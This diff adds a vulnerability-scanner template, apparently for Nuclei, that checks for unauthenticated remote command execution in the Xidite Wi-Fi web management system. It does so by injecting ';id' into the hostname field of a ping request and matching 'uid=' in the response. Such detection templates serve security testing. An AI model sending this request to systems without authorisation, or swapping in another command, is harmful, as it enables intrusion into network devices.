@@ -1,0 +1,30 @@
+id: xiditewifi-jumpto-cookie-bypass
+info:
+  name: xiditewifi-jumpto-cookie-bypass
+  author: apple
+  severity: high
+  description: 西迪特 Wi-Fi Web管理系统 未授权RCE漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/IIphedK_Npni5bJsQHfD0A
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 53
+        DNT: 1
+        Connection: close
+
+        call_function=ping&iface=eth0&hostname=127.0.0.1%3Bid
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
